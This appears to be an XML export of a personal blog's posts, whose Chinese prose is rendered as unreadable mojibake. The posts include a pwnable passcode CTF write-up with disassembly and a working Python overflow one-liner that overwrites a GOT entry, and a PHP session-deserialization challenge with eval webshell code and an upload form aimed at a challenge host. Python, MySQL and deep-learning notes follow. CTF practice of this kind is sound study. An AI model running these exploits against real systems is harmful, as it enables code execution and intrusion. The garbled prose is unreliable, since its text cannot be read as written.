ÈÇ£Ë¶ÅÊÄé‰πàÂàÜÊûêÁ®ãÂ∫èÂë¢ÔºüÊúÄÂÖ≥ÈîÆÁöÑËøòÊòØÂàÜÊûêÁ®ãÂ∫èÁöÑ‰∫§‰∫íËøáÁ®ãÔºåÊØïÁ´üÊàë‰ª¨‰πüÊòØ‰ªéÁ®ãÂ∫èÁöÑËæìÂÖ•ÂÖ•ÊâãÁöÑ„ÄÇ 12345 0x804862a &lt;welcome+33&gt; mov eax, 0x80487dd 0x804862f &lt;welcome+38&gt; lea edx, [ebp - 0x70]‚ñ∫ 0x8048632 &lt;welcome+41&gt; mov dword ptr [esp + 4], edx 0x8048636 &lt;welcome+45&gt; mov dword ptr [esp], eax 0x8048639 &lt;welcome+48&gt; call __isoc99_scanf@plt &lt;0x80484a0&gt; Ê≠§Â§ÑÊòØË∞ÉÁî®scanfÂáΩÊï∞ÁöÑËøáÁ®ãÔºå ÂÖàÂ∞Ü‰∏Ä‰∏™Âú∞ÂùÄ0x80487ddËµãÂÄºÁªôeaxÂØÑÂ≠òÂô®Ôºå‰πãÂêéÂ∞Üebp-0x70ÁöÑÂú∞ÂùÄ‰º†ÁªôedxÂØÑÂ≠òÂô®ÔºåÊ≥®ÊÑèÂà∞ËøôÈáåÁöÑÊìç‰ΩúÁ¨¶ÊòØlea ‰πãÂêéÂÜçÂ∞ÜedxÂØÑÂ≠òÂô®ÁöÑÂÄºÊîæÂà∞Ê†àÁöÑÁ¨¨‰∫åÂ±ÇÔºåÊúÄÂêéÂ∞ÜeaxÂØÑÂ≠òÂô®ÁöÑÂÄºÊîæÂà∞Ê†àÈ°∂„ÄÇ ÊâÄ‰ª•Ë∞ÉÁî®scanfÂáΩÊï∞ÁöÑÊó∂ÂÄôÔºåÊ†àÈ°∂ÊòØ0x80487ddÔºåÂæÄ‰∏ãÂä†4‰∏™Â≠óËäÇÂ≠òÂÇ®ÁöÑÊòØ‰∏Ä‰∏™Â±ÄÈÉ®ÂèòÈáèÂºÄÂßãÁöÑ‰ΩçÁΩÆ(Â∞±ÊòØÂ≠óÁ¨¶‰∏≤sÁöÑÈ¶ñÂú∞ÂùÄ) 123456 0x804862f &lt;welcome+38&gt; lea edx, [ebp - 0x70] 0x8048632 &lt;welcome+41&gt; mov dword ptr [esp + 4], edx 0x8048636 &lt;welcome+45&gt; mov dword ptr [esp], eax‚ñ∫ 0x8048639 &lt;welcome+48&gt; call __isoc99_scanf@plt &lt;0x80484a0&gt; format: 0x80487dd ‚óÇ‚Äî &apos;%100s&apos; vararg: 0xff8e7068 ‚óÇ‚Äî 0x28 /* &apos;(&apos; */ ËøôÊòØÂèÇÊï∞ÁöÑ‰º†ÈÄíËøáÁ®ã Ê≠§Êó∂Ê†à‰∏äÁöÑÂ∏ÉÂ±ÄÔºö 1200:0000‚îÇ esp 0xff8e7050 ‚Äî‚ñ∏ 0x80487dd ‚óÇ‚Äî and eax, 0x73303031 /* &apos;%100s&apos; */01:0004‚îÇ 0xff8e7054 ‚Äî‚ñ∏ 0xff8e7068 ‚óÇ‚Äî 0x28 /* &apos;(&apos; */ ËøôÈáåÊúâ‰∏ÄÁÇπÁñëÊÉë Áõ¥Êé•Êü•ÁúãÂÜÖÂ≠ò 12pwndbg&gt; x/20x 0x80487dd0x80487dd: 0x30303125 0x30303125 ÂÖ∂ÂÆûÂ∞±ÊòØ%100ÁöÑÂ∞èÁ´ØË°®Á§∫ÔºÅÔºÅ ‰ΩÜÊòØÊç¢‰∏ÄÁßçÊñπÂºèÁúã 123pwndbg&gt; x/20i 0x80487dd 0x80487dd: and eax,0x73303031 0x80487e2: add BYTE PTR [edi+0x65],dl Âà∞Â∫ïÊòØÊï∞ÊçÆËøòÊòØÊåá‰ª§ÂÖ®ÁúãÁ®ãÂ∫èÂëò‰∫Ü 123456passcode@prowl:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+str(0x080485d7)&quot; | ./passcodeToddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩ!enter passcode1 : Login OK!Sorry mom.. I got confused about scanf usage :(Now I can safely trust you that you have credential :) ‰∏çËøáËøôÈÅìÈ¢òÁõÆÊàëÊ≤°ÊúâÊêûÂæóÂæàÊ∏ÖÊ•ö]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonÊñáÊ°£ÈòÖËØªÁ¨îËÆ∞1]]></title>
    <url>%2F2019%2F07%2F24%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[python ÂÆòÊñπÊñáÊ°£ÈòÖËØª pythonÂèØËßÜÂåñÁºñÁ®ãÁΩëÁ´ô Âæ™ÁéØ Âæ™ÁéØÁöÑÈóÆÈ¢ò listÁ±ªÂûãÊòØÂèØÂèòÂ∫èÂàó 12345words = ['cat', 'window', 'defenestrate']for w in words[:]: if len(w) &gt; 6: words.insert(0, w)print(words) Â¶ÇÊûúÂ∞Ü‰∏äËø∞‰ª£Á†ÅÁöÑÂæ™ÁéØËØ≠Âè•Êîπ‰∏∫Ôºö for w in words: ÈÇ£‰πàËøô‰∏™Âæ™ÁéØÂ∞±ÂèòÊàê‰∫ÜÊ≠ªÂæ™ÁéØ ÂéüÂõ†ÊòØwordsËøô‰∏™list‰ºöË¢´‰øÆÊîπ ÂêåÊ†∑ÁöÑÂèØ‰ª•ÁúãËøô‰∏™Ôºö 12345basket = ['apple', 'orange', 'pear', 'orange', 'banana']for f in sorted(basket): print(f)print(basket) Âú®ÁªèËøásortedÂáΩÊï∞‰πãÂêéÔºåbasketÂ∑≤ÁªèË¢´‰øÆÊîπ‰∫Ü ÂèØ‰ª•ÁúãËøô‰∏™Ôºö &lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=basket%20%3D%20%5B'apple',%20'orange',%20'pear',%20'orange',%20'banana'%5D%0Afor%20f%20in%20sorted%28basket%29%3A%0A%20%20%20%20print%28f%29%0A&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=5&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt; ÂêåÊ†∑ÁöÑlistËøòÊúâËøôÊ†∑‰∏Ä‰∏™ÈóÆÈ¢òÔºö ‰ª£Á†ÅÂ¶Ç‰∏ãÔºö 1234567def f(a, L=[]): L.append(a) return Lprint(f(1))print(f(2))print(f(3)) &lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=def%20f%28a,%20L%3D%5B%5D%29%3A%0A%20%20%20%20L.append%28a%29%0A%20%20%20%20return%20L%0A%0Aprint%28f%281%29%29%0Aprint%28f%282%29%29%0Aprint%28f%283%29%29&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=15&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt; ‰øÆÊîπÊàêËøôÊ†∑Â∞±Ë°åÔºö 12345def f(a, L = None): if L is None: L = [] L.append(a) return L Âæ™ÁéØÁöÑtricks dictÂæ™ÁéØ 123knights = &#123;'gallahad':'the pure', 'robin':'the brave'&#125;for key, value in knights.items(): print(key, value) listÂæ™ÁéØ 12for index, value in enumerate(['tac', 'tic', 'toe']): print("index = &#123;&#125;, value = &#123;&#125;".format(index, value)) ‰∏§‰∏™listÂæ™ÁéØ 12345questions = ['name', 'quest', 'favorite color']answers = ['lancelot', 'the holy grail', 'blue']for q,a in zip(questions, answers): print("what is your &#123;&#125;? It is &#123;&#125;".format(q, a)) ÈÄÜÂêëÂæ™ÁéØ 123# ÈÄÜÂêëÂæ™ÁéØÂ∫èÂàóÊó∂ÔºåÂÖàÊ≠£ÂêëÔºåÂÜçË∞ÉÁî®reverse()ÂáΩÊï∞for i in reversed(range(1, 10, 2)): print(i) ÊåáÂÆöÈ°∫Â∫èÂæ™ÁéØÔºåÁî®sortedÂáΩÊï∞ ÂèÇÊï∞ÁöÑ‰º†ÈÄí ‰πãÂâçËøò‰∏ÄÁõ¥Ê≤°ÊòéÁôΩpython‰∏≠**paramËøôÁßç‰º†ÈÄíÂΩ¢ÂºèÁöÑÁî®Ê≥ï Ëøô‰∏™Ê†óÂ≠êÂ∞±ÂæàÊ£íÂï¶ 123456789101112def cheeseshop(kind, *arguments, **keywords): print("-- Do you have any", kind, "?") print("-- I'm sorry, we're all out of", kind) for arg in arguments: print(arg) print("-" * 40) for kw in keywords: print(kw, ":", keywords[kw])cheeseshop("Limburger", "It's very runny, sir.", "It's really very, VERY runny, sir.",shopkeeper="Michael Palin", client="John Cleese", sketch="Cheese Shop Sketch") ÁªìÊûúÂ¶Ç‰∏ãÔºö 12345678-- Do you have any Limburger ?-- I&apos;m sorry, we&apos;re all out of LimburgerIt&apos;s very runny, sir.It&apos;s really very, VERY runny, sir.----------------------------------------shopkeeper : Michael Palinsketch : Cheese Shop Sketchclient : John Cleese Á¨¨‰∏Ä‰∏™kindÂèÇÊï∞Â∞±ÊòØÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Ôºå‰πãÂêéargumentsÁõ∏ÂΩì‰∫é‰∏Ä‰∏™Êé•Êî∂‰∫Ü‰∏Ä‰∏™listÔºåkeywordsÊé•Êî∂‰∫Ü‰∏Ä‰∏™dict Ëß£ÂåÖÂèÇÊï∞ÂàóË°® ÊØîÂ¶ÇËøô‰∏™Ê†óÂ≠êÔºö 12args = [3,6]list(range(*args)) ËæìÂá∫ÁöÑÁªìÊûúÂ∞±ÊòØ [3,4,5] ‰πüÂ∞±ÊòØËØ¥Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá*ËøêÁÆóÁ¨¶Êù•ÂØπ‰∏Ä‰∏™listËøõË°åËß£ÂåÖÂπ∂Â∞ÜÂÖ∂‰Ωú‰∏∫ÂèÇÊï∞‰º†ÈÄí ÂåøÂêçÂáΩÊï∞lambda 12pairs = [(1, 'one'), (2, 'two'), (3, 'three'), (4, 'four')]pairs.sort(key=lambda pair:pair[1]) sortÊñπÊ≥ïÊúâ‰∏§‰∏™ÂèÇÊï∞Ôºå‰∏Ä‰∏™ÊòØÊåáÂÆöÂæÖÊéíÂ∫èÁöÑÂÖ≥ÈîÆÂ≠óÔºå‰∏Ä‰∏™ÊòØreversedÔºåÂÖ∂‰∏≠keyÁî®‰∏Ä‰∏™ÂåøÂêçÂáΩÊï∞ËøõË°åÊåáÂÆöÔºåÊúâ‰∏ÄÁÇπÂáΩÊï∞ÂºèÁºñÁ®ãÁöÑÂë≥ÈÅì]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Êé¢ÂØªÊï∞ÊçÆÂ∫ì]]></title>
    <url>%2F2019%2F07%2F22%2F%E6%8E%A2%E5%AF%BB%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[mysqlÂëΩ‰ª§Ë°åÊìç‰ΩúÂ∞èÁªì ÊÑüËßâËøô‰∫õÁü•ËØÜÂèàÂø´ÂøòËÆ∞‰∫Ü ÁôªÈôÜ mysql -u root -p ÂàõÂª∫Êï∞ÊçÆÂ∫ì create database databasename Âà†Èô§Êï∞ÊçÆÂ∫ì drop database databasename ‰ªéÂ§ñÈÉ®sqlÊñá‰ª∂ÂØºÂÖ•ÔºåÂ¶ÇÊûúsqlÊñá‰ª∂‰∏≠Ê≤°ÊúâÂàõÂª∫Êï∞ÊçÆÂ∫ìÈúÄË¶ÅÂÖàÊåáÂÆö‰∏Ä‰∏™Êï∞ÊçÆÂ∫ìÁÑ∂Âêésource path/*.sqlÂ∞±ÂèØ‰ª•ÂØºÂÖ•‰∫ÜÔºåÂÜç‰πü‰∏çÁî®ÂèóÁÉ¶‰∫∫ÁöÑphpmyadminÂΩ±Âìç‰∫Ü Âà†Èô§Êï∞ÊçÆË°®drop table table_name ÂØºÂá∫Ë°®mysqldump -u root -p RUNOOB runoob_tbl &gt; dump.txt ÂØºÂá∫Êï∞ÊçÆÂ∫ìmysqldump -u root -p RUNOOB &gt; database_dump.txt Â§á‰ªΩÊâÄÊúâÊï∞ÊçÆÂ∫ìmysqldump -u root -p --all-databases &gt; database_dump.txt ‰∏ÄËà¨sqlÊñá‰ª∂ÁöÑÂÜôÊ≥ïÔºö 123456789drop database if exists DBName;creat database DBName;use DBName;#ÂºÄÂßãÂàõÂª∫Ë°®create ......#ÂºÄÂßãÊèíÂÖ•Êï∞ÊçÆinsert.... ‰ΩøÁî®pymysqlËøûÊé•Êï∞ÊçÆÂ∫ì 1234567891011import pymsqlcon = pymysql.connect('localhost', 'root', '', 'mpsa')try: with con.cursor() as cursor: sql = 'drop database runoob' cursor.execute(sql) con.commit()finally: con.close() ÈÇ£‰∏™cursorÂáΩÊï∞Êàë‰πü‰∏çÊòØÂæàÊòéÁôΩ‰∏∫‰ªÄ‰πàÔºå‰∏çËøá‰∏ÄËà¨ÁöÑÁî®Ê≥ïÂ∞±ÊòØËøôÊ†∑Âï¶ phpËøûÊé•Êï∞ÊçÆÂ∫ì ‰ΩøÁî®phpËøûÊé•Êï∞ÊçÆÂ∫ì,ÂàõÂª∫Êï∞ÊçÆÂ∫ìÔºåÁÑ∂ÂêéÂà†Èô§ 123456789101112131415$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(!$conn)&#123; die("error!!");&#125;echo "ËøûÊé•ÊàêÂäü";//Êü•ËØ¢Êï∞ÊçÆ$sql = "create database runoob";$retval = mysqli_query($conn, $sql);if(!$retval)&#123; die("Êü•ËØ¢Êï∞ÊçÆÂ§±Ë¥•ÔºÅ");&#125;echo "ÂàõÂª∫ÊàêÂäü";$sql1 = "drop database runoob";$retval = mysqli_query($conn, $sql);mysqli_close($conn); ÈÅáÂà∞‰∫ÜÈóÆÈ¢òÔºö Êü•‰∫Ü‰∏Ä‰∏ãstackoverflow ÁúãÂà∞‰∫ÜËøô‰∏™ÂõûÁ≠îÔºö The mysqli-&gt;connect_error property only works properly as of PHP versions 5.2.9 and 5.3.0. Use the mysqli_connect_error() function if compatibility with earlier PHP versions is required. 12345678910111213141516171819$mysqli = new mysqli('localhost', 'my_user', 'my_password', 'my_db');/* * This is the "official" OO way to do it, * BUT $connect_error was broken until PHP 5.2.9 and 5.3.0. */if ($mysqli-&gt;connect_error) &#123; die('Connect Error (' . $mysqli-&gt;connect_errno . ') ' . $mysqli-&gt;connect_error);&#125;/* * Use this instead of $connect_error if you need to ensure * compatibility with PHP versions prior to 5.2.9 and 5.3.0. */if (mysqli_connect_error()) &#123; die('Connect Error (' . mysqli_connect_errno() . ') ' . mysqli_connect_error());&#125; ÂéüÊù•ÊòØÂª∫Á´ãËøáÁ®ã‰∏≠ÁöÑ‰∏çÁ®≥ÂÆöÔºåÊÄ™‰∏çÂæóÊàëÊñ∞Âª∫ÁöÑÊï∞ÊçÆÂ∫ìÊ≤°ÊúâË¢´Âà†Êéâ. ÂèÇËÄÉ stackoverflowÁöÑÂõûÁ≠î pymysqlÊñáÊ°£ÔºåÂÜôÁöÑÂæàÁÆÄÂçï]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-challenge9]]></title>
    <url>%2F2019%2F07%2F22%2Fphp-challenge9%2F</url>
    <content type="text"><![CDATA[php-challenge 9 Á¨¨‰∏ÄÊ¨°Êé•Ëß¶Âà∞Ëøô‰∏™È¢òÁõÆÔºåË¢´ÊÉäÂëÜ‰∫Ü 12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; ÂàùÁúãÊ∫ê‰ª£Á†ÅËßâÂæóÂπ∂Ê≤°ÊúâÂì™ÈáåÂèØ‰ª•ËÆ©ÊàëÂèçÂ∫èÂàóÂåñÊ≥®ÂÖ•ÁöÑÂú∞Êñπ ‰ΩÜÊòØÈóÆÈ¢òÂ∞±Âá∫Âú®Á¨¨‰∏ÄÂè•ËØùÔºö ini_set('session.serialize_handler', 'php'); ÂÖ≥ÈîÆÁÇπÂú®‰∫éÔºåÂ¶ÇÊûúËÑöÊú¨‰∏≠ËÆæÁΩÆÁöÑÂ∫èÂàóÂåñÂ§ÑÁêÜÂô®‰∏éphp.iniËÆæÁΩÆÁöÑ‰∏çÂêåÔºåÊàñËÄÖ‰∏§‰∏™ËÑöÊú¨Ê≥®ÂÜåsession‰ΩøÁî®ÁöÑÂ∫èÂàóÂåñÂ§ÑÁêÜÂô®‰∏çÂêåÔºåÈÇ£‰πàÂ∞±‰ºöÂá∫Áé∞ÂÆâÂÖ®ÈóÆÈ¢ò„ÄÇ Âè™ÈúÄË¶ÅÂä†‰∏Ä‰∏™|Â∞±Ë°å ËøôÈÅìjarvisOjÈ¢òÁõÆÂ∞±ÊòØËøô‰∏™ÂéüÈ¢ò ËøôÈáåËøòÁî®Âà∞‰∫ÜÂè¶Â§ñ‰∏Ä‰∏™ÊºèÊ¥ûÔºö Ëá™Â∑±ÊûÑÈÄ†‰∏Ä‰∏™ÁΩëÈ°µÂ¶Ç‰∏ãÔºö 12345&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; ÁÑ∂ÂêéÂú®‰∏ä‰º†‰∏Ä‰∏™Êñá‰ª∂ÔºåÊú¨Âú∞ÊäìÂåÖÔºåËøôÈáåÈÅáÂà∞‰∫Ü‰∏ÄÁÇπÂ∞èÈóÆÈ¢òÔºåÂ∞±ÊòØÊ≤°ÂäûÊ≥ïÊäìÂà∞Êú¨Âú∞ÁöÑÂåÖÔºåÂèØ‰ª•ÈÄöËøáÁõ¥Êé•ÂØπÂ±ÄÂüüÁΩëÁöÑÁΩëÁªúËøûÊé•ËøõË°åËÆæÁΩÆÂç≥ÂèØ. Ê≠§Êó∂Â∞±ÂèØ‰ª•ÁúãÂà∞‰∫Ü Êé•‰∏ãÊù•ÁªßÁª≠Âà©Áî® tql„ÄÇ„ÄÇ„ÄÇ ÊúâË∂£ÁöÑphpÂèçÂ∫èÂàóÂåñÊÄªÁªì szfszf jarvisoj-web-writeup]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[deep learning1]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning1%2F</url>
    <content type="text"><![CDATA[ÊÑüÁü•Êú∫Ë°•ÂÖÖ Êé•ÁùÄÂÜô ÊÑüÁü•Êú∫ÁöÑËÆ≠ÁªÉ‰∏≠ÔºåËÄÅÂ∏àËøòÊèê‰æõ‰∫Ü‰∏ÄÈÉ®‰ªΩËµÑÊñôÔºåÊØîÂ¶ÇËÆ≠ÁªÉÂá∫$y=2x$ Êàë‰ª¨ÁÆÄË¶ÅÂú∞Áúã‰∏Ä‰∏ã‰∏ÄÊ¨°ËÆ≠ÁªÉÁöÑÁªìÊûúÔºö bias x y w0 w1 yout y-yout adj0 adj1 alpha w0new w1new 1 0.512 1.023 0.719 0.403 0.926 0.977 0.977 0.500 0.7 0.788 0.438 ËøõË°åÂæàÂ§öÊ¨°ËÆ≠ÁªÉ‰πãÂêéÁîªÂá∫ÁöÑÂõæÂΩ¢Ôºö È¢ÑÊµãÁöÑËøòÊòØÊå∫ÂáÜÁ°ÆÁöÑ ‰∏∫‰ªÄ‰πàÈúÄË¶ÅbiasÔºü Ê¶ÇÂøµ‰∏äÂæàÂ•ΩÁêÜËß£ÔºåbiasÂ∞±ÊòØÂ∞Ü‰∏Ä‰∏™Ê≠£ÊØî‰æãÂáΩÊï∞Âèò‰∏∫‰∫Ü‰∏ÄÊ¨°ÂáΩÊï∞ÔºåËøôÊ†∑‰∏çÂøÖÊØèÊ¨°ÈÉΩËøáÂéüÁÇπÔºåÂàÜÁ±ªÁöÑÂáÜÁ°ÆÊÄß‰πüÂ∞±Â§ßÂ§ßÂú∞ÊèêÈ´ò‰∫Ü Â§öÂ±ÇÊÑüÁü•Êú∫ ‰∏ÄÂ±ÇÁöÑÊÑüÁü•Êú∫ÊòØÊ≤°ÂäûÊ≥ïÂ§ÑÁêÜÂºÇÊàñÈóÆÈ¢òÁöÑ ÊâÄ‰ª•ÈúÄË¶ÅÂ¢ûÂä†ÈöêËóèÂ±Ç Â∞±ÂÉè‰∏ãÈù¢ËøôÊ†∑Ôºö ËøôÊ†∑Â∞±ÂèØ‰ª•ÂÅöÂà∞‰∫ÜÔºö ÊÑüËßâMLPÁöÑÊï∞Â≠¶Áü•ËØÜÂ§™ËøáÂ§çÊùÇ‰∫ÜÔºåÊöÇÊó∂ÊîæÁùÄ keras ‰ªéÊ†óÂ≠ê‰ª£Á†ÅÂºÄÂßãÔºö 12345678910111213141516171819202122from keras.models import Sequentialmodel = Sequential()from keras.layers import Dense'''‰ΩøÁî®addÊù•Â†ÜÂè†Ê®°Âûã'''model.add(Dense(units=64, activation='relu', input_dim=100))model.add(Dense(units=10, activation='softmax'))'''‰ΩøÁî®compileÊù•ÈÖçÁΩÆÂ≠¶‰π†ËøáÁ®ã'''model.compile(loss='categorical_crossentropy', optimizer='sgd', metrics=['accuracy'])# x_train Âíå y_train ÊòØ Numpy Êï∞ÁªÑ -- Â∞±ÂÉèÂú® Scikit-Learn API ‰∏≠‰∏ÄÊ†∑„ÄÇmodel.fit(x_train, y_train, epochs=5, batch_size=32)'''ËØÑ‰º∞Ê®°Âûã'''loss_and_metrics = model.evaluate(x_test, y_test, batch_size=128)classes = model.predict(x_test, batch_size=128) Sequential compile Âú®ËÆ≠ÁªÉÊ®°Âûã‰πãÂâçÔºåÈúÄË¶ÅÈÖçÁΩÆÂ≠¶‰π†ËøáÁ®ãÔºåcompileÊé•Êî∂‰∏â‰∏™ÂèÇÊï∞ ‰ºòÂåñÂô®optimizer ÊçüÂ§±ÂáΩÊï∞loss ËØÑ‰º∞Ê†áÂáÜmetrics ‰∏Ä‰∏™‰∏™Êù•Áúã ‰ºòÂåñÂô® ÂèØ‰ª•ÂÖàÂÆû‰æãÂåñ‰∏Ä‰∏™‰ºòÂåñÂô®ÂØπË±°ÔºåÁÑ∂ÂêéÂ∞ÜÂÆÉ‰º†ÂÖ•model.compile()ÔºåÊàñËÄÖÂèØ‰ª•ÈÄöËøá ÊçüÂ§±ÂáΩÊï∞ ÊçüÂ§±ÂáΩÊï∞ÔºàÊàñÁß∞ÁõÆÊ†áÂáΩÊï∞„ÄÅ‰ºòÂåñËØÑÂàÜÂáΩÊï∞ÔºâÊòØÁºñËØëÊ®°ÂûãÊó∂ÊâÄÈúÄÁöÑ‰∏§‰∏™ÂèÇÊï∞‰πã‰∏ÄÔºö 1model.compile(loss='mean_squared_error', optimizer='sgd') Êàë‰ª¨ÂèØ‰ª•‰º†ÈÄí‰∏Ä‰∏™Áé∞ÊúâÁöÑÊçüÂ§±ÂáΩÊï∞ÂêçÔºåÊàñËÄÖ‰∏Ä‰∏™tensorflowÁ¨¶Âè∑ÂáΩÊï∞ÔºåÊúâ‰ª•‰∏ã‰∏§‰∏™ÂèÇÊï∞ y_true: ÁúüÂÆûÊ†áÁ≠æ. y_pred: È¢ÑÊµãÂÄº,ÂÖ∂shape‰∏éy_trueÁõ∏Âêå ÂèØÁî®ÁöÑÊçüÂ§±ÂáΩÊï∞Ôºö mean_squared_error mean_absolute_error Á≠â ÂèÇËÄÉ Á•ûÁªèÁΩëÁªú‰∏≠w,bÂèÇÊï∞ÁöÑ‰ΩúÁî®Ôºà‰∏∫‰ΩïÈúÄË¶ÅÂÅèÁΩÆbÁöÑËß£ÈáäÔºâ Ê∑±Â∫¶Â≠¶‰π†‰∏≠ÂÅèÁßªÈ°πbiasÁöÑ‰ΩúÁî®]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[deep learning0]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning0%2F</url>
    <content type="text"><![CDATA[deep learning Êï¥ÁêÜ‰∏Ä‰∏ã‰∏äËØæÁöÑÁ¨îËÆ∞Ôºå‰∏çÁÑ∂ÂÖ®ÈÉΩ‰ºöÂøò‰∫ÜÂéª Êó†ÁõëÁù£Â≠¶‰π† self organizing map ÁÆÄÁß∞SOMÁÆóÊ≥ï Â§ßÊÑèÔºöÁªôÂÆö‰∏Ä‰∏™ÂêëÈáè$v_{k}$,ÂØªÊâæÂà∞Ë∑ùÁ¶ªÊúÄËøëÁöÑÁ•ûÁªèÂÖÉ ÊâæÂà∞ÊúÄÊé•ËøëÁöÑÁ•ûÁªèÂÖÉ $$n_{bmu}=\underset{1\leqslant i\leqslant m}{argmin}\left | v_{k}-n_{i} \right |$$ Êõ¥Êñ∞$n_{i}$ wikipedia‰∏ä‰∏ÄÂº†ÂæàÂΩ¢Ë±°ÁöÑÂõæÁâá: ËìùËâ≤ÊñëÁÇπÊòØËÆ≠ÁªÉÊï∞ÊçÆÁöÑÂàÜÂ∏ÉÔºåÂ∞èÁôΩËâ≤ÂÖâÁõòÊòØ‰ªéËØ•ÂàÜÂ∏É‰∏≠ÊäΩÂèñÁöÑÂΩìÂâçËÆ≠ÁªÉÊï∞ÊçÆ„ÄÇÈ¶ñÂÖàÔºàÂ∑¶ÔºâÔºåSOMËäÇÁÇπ‰ªªÊÑèÂú∞‰Ωç‰∫éÊï∞ÊçÆÁ©∫Èó¥‰∏≠„ÄÇÈÄâÊã©ÊúÄÊé•ËøëËÆ≠ÁªÉÂü∫ÂáÜÁöÑËäÇÁÇπÔºà‰ª•ÈªÑËâ≤Á™ÅÂá∫ÊòæÁ§∫Ôºâ„ÄÇÂÆÉË¢´ÁßªÂêëËÆ≠ÁªÉÊï∞ÊçÆÔºåÂõ†‰∏∫ÔºàÂú®ËæÉÂ∞èÁ®ãÂ∫¶‰∏äÔºâÊòØÂÆÉÂú®ÁΩëÊ†º‰∏äÁöÑÈÇªÂ±Ö„ÄÇÂú®Â§öÊ¨°Ëø≠‰ª£‰πãÂêéÔºåÁΩëÊ†ºÂÄæÂêë‰∫éËøë‰ººÊï∞ÊçÆÂàÜÂ∏ÉÔºàÂè≥Ôºâ„ÄÇ ÊúâÁõëÁù£Â≠¶‰π† Êï∞Â≠¶Áü•ËØÜ ÁâπÂæÅÂêëÈáè Á∫øÊÄß‰ª£Êï∞‰∏≠ÁöÑÁâπÂæÅÂêëÈáèÔºö ÂØπ‰∫é‰∏Ä‰∏™ÁªôÂÆöÁöÑÊñπÈòµAÔºåÂÆÉÁöÑÁâπÂæÅÂêëÈáèvÁªèËøáÁ∫øÊÄßÂèòÂåñ‰πãÂêéÔºåÂæóÂà∞ÁöÑÊñ∞ÂêëÈáè‰ªçÁÑ∂‰∏éÂéüÊù•ÁöÑv‰øùÊåÅÂú®Âêå‰∏ÄÊù°Áõ¥Á∫ø‰∏äÔºå‰ΩÜÂÖ∂ÈïøÂ∫¶ÊàñÊñπÂêë‰πüËÆ∏‰ºöÊîπÂèòÔºåÂç≥Ôºö $$Av=\lambda v$$ Ê≠§Êó∂$v$Â∞±ÊòØÁü©Èòµ$A$ÁöÑÁâπÂæÅÂêëÈáèÔºå$\lambda$Â∞±ÊòØÂØπÂ∫îÁöÑÁâπÂæÅÂÄº Ëøõ‰∏ÄÊ≠•ÔºöÂú®‰∏ÄÂÆöÊù°‰ª∂‰∏ãÔºå‰∏Ä‰∏™ÂèòÊç¢ÂèØ‰ª•Áî±ÂÖ∂ÁâπÂæÅÂÄºÁâπÂæÅÂêëÈáèÂÆåÂÖ®Ë°®Ëø∞Ôºå‰πüÂ∞±ÊòØËØ¥ÔºåÊâÄÊúâÁöÑÁâπÂæÅÂêëÈáèÁªÑÊàê‰∫ÜËøôÂêëÈáèÁ©∫Èó¥ÁöÑ‰∏ÄÁªÑÂü∫Â∫ï„ÄÇ ‰∏Ä‰∏™ÁâπÂæÅÁ©∫Èó¥ÊòØÂÖ∑ÊúâÁõ∏ÂêåÁâπÂæÅÂÄºÁöÑÁâπÂæÅÂêëÈáè‰∏é‰∏Ä‰∏™ÂêåÁª¥Êï∞ÁöÑÈõ∂ÂêëÈáèÁöÑÈõÜÂêàÔºåÊØîÂ¶Ç$E_{\lambda }=\left { u\in V | Au=\lambda u\right }$Âç≥‰∏∫Á∫øÊÄßÂèòÂåñ$A$‰∏≠‰ª•$\lambda$‰∏∫ÁâπÂæÅÂÄºÁöÑÁâπÂæÅÁ©∫Èó¥ ÊäΩË±°Ê¶ÇÂøµ‰∏çÂÆπÊòìÁêÜËß£Ôºå‰∏æÂá†‰∏™Ê†óÂ≠êÔºö 